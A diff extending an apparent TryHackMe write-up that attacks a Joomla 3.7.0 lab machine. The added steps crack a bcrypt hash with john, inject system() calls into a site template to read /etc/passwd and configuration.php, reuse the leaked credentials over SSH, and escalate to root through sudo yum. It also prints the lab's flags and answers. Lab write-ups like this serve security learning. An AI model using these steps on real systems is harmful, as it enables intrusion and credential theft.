@@ -49,7 +49,7 @@ joomscan -u [IP]
 **Answer**
 ###### Joomla 3.7.0
 
-2. Find an exploit
+2. Find and use an exploit
 
 With the Joomla version, we can try to find an exploit
 ```
@@ -92,6 +92,84 @@ Result:
 | 811 | Super User | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    |
 +-----+------------+---------------------+---------+--------------------------------------------------------------+----------+
 ```
+
+We have the hash password for the **Super User** : jonah
+
+4. Decrypt the password
+- Firt : find the hash type
+**$2y$**10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm 
+- Second : search in Internet what is this type
+**bcrypt**
+- Thrid : Use john and decrypt the password
+    - Create a file and copy/paste the hash
+    - Use john
+```
+john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash_jonah
+```
+
+**Question**
+###### What is Jonah's cracked password?
+**Answer**
+###### spiderman123
+
+5. Joomla
+
+Let's navigate in the administration portal.
+User --> just jonah is here with super user privileges
+User Groups --> Only 1 user (Jonah) is here
+
+Now let's move to **Configuration/Global** --> Nothing really special
+Move to **Configuration/Templates** --> **One Template is used for allpages: Protostar**. Good information. We probably use this template to gather more informaiton.
+
+We can edit this template to see if we can exploit it by adding some code. For that: 
+- Click on Templates and select Protostar
+- Edit index.php
+- Add the line: 
+```
+system("cat /etc/passwd")
+```
+- Save and refresh the Home page
+**Finding** : Jonah Jameson:/home/jjameson:/bin/bash
+
+Now we can try to find some information in configuration.php
+- Add the line : 
+```
+system("cat configuration.php")
+```
+**Finding** : public $user = 'root'; public $password = 'nv5uz9r3ZEDzVjNu'
+
+6. SSH
+
+With the user **jjameson** and this password **nv5uz9r3ZEDzVjNu**, we can SSH the server.
+
+**Question**
+###### What is the user flag?
+**Answer**
+###### 27a260fe3cba712cfdedb1c86d80442e
+
+7. Privilege escalation
+
+- First: check what actions can do jjameson
+```
+sudo -l
+Result: jjameson can execute yum
+```
+- Second: check https://gtfobins.github.io/gtfobins/yum/
+- Third: Create a file and copy/paste all command from the website
+- Fourth : Make this file executable
+```
+chmod +x yum.sh
+```
+- Fifth : execute
+```
+./yum.sh
+```
+- Sixth: We are **root**
+
+**Question**
+###### What is the root flag?
+**Answer**
+###### eec3d53292b1821868266858d7fa6f79
 
 
 
